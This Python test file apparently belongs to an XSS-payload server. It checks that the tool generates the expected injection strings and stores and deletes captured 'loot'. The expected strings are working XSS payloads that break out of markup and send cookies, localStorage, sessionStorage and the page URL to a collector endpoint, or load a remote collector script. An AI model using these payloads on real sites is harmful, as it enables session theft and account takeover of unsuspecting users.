import json

from app.models import XSS, Client

from .fixtures import client
from .functions import *


def test_generate_payload(client):
    login(client, username="admin", password="xss", remember=False)
    create_client(client, name="name1", description="desc1")
    client_name1 = Client.query.first()
    rv = generate_payload(
        client,
        1,
        url="http://127.0.0.1",
        stored=1,
        cookies=1,
        local_storage=1,
        session_storage=1,
        code="html",
        geturl=1,
        customParam="test",
        customParam2="test2",
    )
    expected_response = '\'>"><script>new Image().src="http://127.0.0.1/api/x/s/{}?cookies="+encodeURIComponent(document.cookie)+"&local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"&session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"&origin_url="+encodeURIComponent(location.href)+"&customParam=test&customParam2=test2"</script>'.format(
        client_name1.uid
    )
    assert str.encode(expected_response) in rv.data
    rv = generate_payload(client, 1, code="js", i_want_it_all=1, url="http://127.0.0.1")
    expected_response = (
        ';};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.onload=function(){sendData("http://127.0.0.1/api/x/r/'
        + client_name1.uid
        + '","")};document.body.appendChild(js);'
    )
    assert str.encode(expected_response) in rv.data
    rv = generate_payload(client, 1)
    assert b"Missing url parameter" in rv.data
    rv = generate_payload(client, 1, url="http://127.0.0.1", code="test")
    assert b"Unknown code type" in rv.data
    rv = generate_payload(client, 1, url="http://127.0.0.1", code="js")
    expected_response = ';};new Image().src="http://127.0.0.1/api/x/r/' + client_name1.uid + '";'
    assert str.encode(expected_response) in rv.data
    rv = generate_payload(client, 1, url="http://127.0.0.1", code="html", i_want_it_all=1)
    expected_response = (
        '\'>"><script src=http://127.0.0.1/static/collector.min.js></script><script>sendData("http://127.0.0.1/api/x/r/' + client_name1.uid + '", "")</script>'
    )
    assert str.encode(expected_response) in rv.data
    rv = generate_payload(client, 1, url="http://127.0.0.1", code="html")
    expected_response = '\'>"><img src="http://127.0.0.1/api/x/r/{}" />'.format(client_name1.uid)
    assert str.encode(expected_response) in rv.data


def test_delete_xss(client):
    login(client, username="admin", password="xss", remember=False)
    create_client(client, name="name1", description="desc1")
    client_name1 = Client.query.first()
    get_x(client, "s", client_name1.uid)
    assert XSS.query.count() == 1
    delete_xss(client, 1)
    assert XSS.query.count() == 0


def test_get_loot(client):
    login(client, username="admin", password="xss", remember=False)
    create_client(client, name="name1", description="desc1")
    client_name1 = Client.query.first()
    get_x(client, "s", client_name1.uid, cookies="cookie=good")
    rv = get_loot_type(client, 1, "cookies")
    print(rv.data)
    assert json.loads(rv.data)["data"][0] == {"cookie": "good"}


def test_delete_loot(client):
    login(client, username="admin", password="xss", remember=False)
    create_client(client, name="name1", description="desc1")
    client_name1 = Client.query.first()
    get_x(client, "s", client_name1.uid, cookies="cookie=good")
    delete_loot_type(client, 1, "cookies")
    print(json.loads(XSS.query.first().data))
    assert json.loads(XSS.query.first().data) == {}
